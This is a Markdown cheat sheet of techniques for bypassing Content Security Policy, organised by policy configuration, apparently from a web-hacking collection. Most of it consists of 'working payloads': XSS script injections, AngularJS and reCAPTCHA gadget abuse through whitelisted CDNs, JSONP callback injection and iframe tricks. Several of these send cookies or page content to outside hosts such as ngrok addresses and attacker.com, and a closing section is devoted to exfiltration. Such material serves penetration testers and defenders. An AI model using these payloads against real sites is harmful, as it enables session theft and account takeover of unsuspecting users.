# CSP Bypass

## Unsafe CSP Rules
**'unsafe-inline'**
```html
Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
```
Working payload:
```javascript
"/><script>alert(1);</script>
```
-----
**self + 'unsafe-inline' via Iframes**

A configuration such as:
```html
Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’;
```
Prohibits usage of any functions that execute code transmitted as a string. For example: eval, setTimeout, setInterval will all be blocked because of the setting unsafe-eval

Any content from external sources is also blocked, including images, CSS, WebSockets, and, especially, JS

* **Via text & images**
Modern browsers transform images and texts into HTML files to visualize them better (set background, center, etc).

Therefore, if you open an image or txt file such as `favicon.ico` or `robots.txt` with an **iframe**, you will open it as HTML.

These kinds of pages usually don't have **CSP headers** and might not have `X-Frame-Options`, so you can execute arbitrary **JS** from them:

```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
* **Via Errors**
Same as text files or images, error responses usually don't have **CSP headers** and might not have `X-Frame-Options`. So, you can force errors and load them inside an iframe:

```javascript
// Force nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Force error via long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Force error via long cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Don't forget to remove them
for(var i=0;i<5;i++){document.cookie=i+"="}
```
```javascript
// After any of the previous examples, you can execute JS in the iframe with something like:
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
-----
**'unsafe-eval'**
```html
Content-Security-Policy: script-src https://google.com 'unsafe-eval'; 
```
Working payload:
```javascript
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
-----
**strict-dynamic**

If you can somehow make an allowed JS code created a new script tag in the DOM with your JS code, because an allowed script is creating it, the new script tag will be allowed to be executed.

-----
**Wildcard (*)**
```html
Content-Security-Policy: script-src 'self' https://google.com https: data *; 
```
Working payload:
```javascript
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
-----
**Lack of object-src and default-src**
> It looks like this is not longer working!
```javascript
Content-Security-Policy: script-src 'self' ;
```
Working payloads:
```javascript
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
-----
**File Upload + 'self'**
```javascript
Content-Security-Policy: script-src 'self';  object-src 'none' ; 
```
If you can upload a JS file you can bypass this CSP:

Working payload:
```javascript
"/>'><script src="/uploads/picture.png.js"></script>
```
-----
**Third Party Endpoints + ('unsafe-eval')**
```javascript
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
```
Load a vulnerable version of angular and execute arbitrary JS:
```javascript
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
  </script>
  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
Payloads using Angular + a library with functions that return the window object:
[Post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)
```javascript
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
 {{[].empty.call().alert([].empty.call().document.domain)}}
 {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].erase.call().alert('xss')}}
</div>
```

**Abusing google recaptcha JS code**
According to [this CTF writeup](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) you can abuse https://www.google.com/recaptcha/ inside a CSP to executa arbitrary JS code bypassing the CSP:
```javascript
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

```
-----
**Third Party Endpoints + JSONP**
```javascript
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenarios like this where script-src is set to self and a particular domain which is whitelisted can be bypassed using JSONP. JSONP endpoints allow insecure callback methods which allow an attacker to perform XSS, working payload:
```javascript
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```
```javascript
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[JSONBee](https://github.com/zigoo0/JSONBee) contains ready to use JSONP endpoints to CSP bypass of different websites.

-----
**Folder path bypass**
If CSP policy points to a folder and you use `%2f` to encode `"/"`, it is still considered to be inside the folder. All browsers seem to agree with that.
This leads to a possible bypass, by using `"%2f..%2f"` if the server decodes it. For example, if CSP allows `http://example.com/company/` you can bypass the folder restriction and execute: `http://example.com/company%2f..%2fattacker/file.js`

* [Example](https://jsbin.com/werevijewa/edit?html,output)

-----
**Iframes JS execution**

**Iframes in XSS**

There are 3 ways to indicate the content of an iframed page:
* Via src indicating an URL (the URL may be cross origin or same origin)
* Via src indicating the content using the data: protocol
* Via srcdoc indicating the content

**Accesing Parent & Child vars**
```html
<html>
  <script>
  var secret = "31337s3cr37t";
  </script>

  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if2" src="child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
  function access_children_vars(){
    alert(if1.secret);
    alert(if2.secret);
    alert(if3.secret);
    alert(if4.secret);
  }
  setTimeout(access_children_vars, 3000);
  </script>
</html>

```
```html
<!-- content of child.html -->
<script>
var secret="child secret";
alert(parent.secret)
</script>
```
If you access the previous html via a http server (like python3 -m http.server) you will notice that all the scripts will be executed (as there is no CSP preventing it)., the parent won’t be able to access the secret var inside any iframe and only the iframes if2 & if3 (which are considered to be same-site) can access the secret in the original window.
Note how if4 is considered to have null origin.

**Iframes with CSP**

The self value of script-src won’t allow the execution of the JS code using the data: protocol or the srcdoc attribute.
However, even the none value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the src attribute.
Therefore it’s possible to bypass the CSP of a page with:
```html
<html>
<head>
 <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
  <script>
  var secret = "31337s3cr37t";
  </script>
  <iframe id="if1" src="child.html"></iframe>
  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```
Note how the previous CSP only permits the execution of the inline script.
However, only if1 and if2 scripts are going to be executed but only if1 will be able to access the parent secret.

![spaces_-L_2uGJGU7AVNRcqRvEi_uploads_5juDb7xa6pEa6sOoW7Ga_image](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/f95c1c69-f089-470c-ab86-5b023b9f27cd)

Therefore, it’s possible to bypass a CSP if you can upload a JS file to the server and load it via iframe even with script-src 'none'. This can potentially be also done abusing a same-site JSONP endpoint.

You can test this with the following scenario were a cookie is stolen even with script-src 'none'. Just run the application and access it with your browser:
```javascript
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

**Other Payloads found on the wild**
```javascript
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

**Iframe sandbox**

The sandbox attribute enables an extra set of restrictions for the content in the iframe. By default, no restriction is applied.
When the sandbox attribute is present, and it will:
* treat the content as being from a unique origin
* block form submission
* block script execution
* disable APIs
* prevent links from targeting other browsing contexts
* prevent content from using plugins (through <embed>, <object>, <applet>, or other)
* prevent the content to navigate its top-level browsing context
* block automatically triggered features (such as automatically playing a video or automatically focusing a form control)
The value of the sandbox attribute can either be empty (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions.
```javascript
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```
-----

**missing base-uri**

If the base-uri directive is missing you can abuse it to perform a dangling markup injection.
Moreover, if the page is loading a script using a relative path (like /js/app.js) using a Nonce, you can abuse the base tag to make it load the script from your own server achieving a XSS.
If the vulnerable page is loaded with httpS, make use an httpS url in the base.

```html
<base href="https://www.attacker.com/">
```
-----
**AngularJS and whitelisted domain**
```javascript
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
If the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable classes. For more details visit this awesome [git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) repo.

Working payloads:
```javascript
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Other JSONP arbitrary execution endpoints can be found in [here](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

-----

**'unsafe-inline'; img-src *; via XSS***
```html
default-src 'self' 'unsafe-inline'; img-src *;
```
'unsafe-inline' means that you can execute any script inside the code (XSS can execute code) and img-src * means that you can use in the webpage any image from any resource.
You can bypass this CSP by exfiltrating the data via images (in this occasion the XSS abuses a CSRF where a page accessible by the bot contains an SQLi, and extract the flag via an image):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

-----

## CSP Exfiltration Bypasses
If there is a strict CSP that doesn't allow you to interact with external servers, there are some things you can always do to exfiltrate the information.

**Location**

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split('=')[1]+"."; 
document.location = "https://attacker.com/?" + sessionid;
```

**Meta tag**

You could redirect by injecting a meta tag (this is just a redirect, this won't leak content)
```javascript
<meta http-equiv="refresh" content="1; http://attacker.com">
```














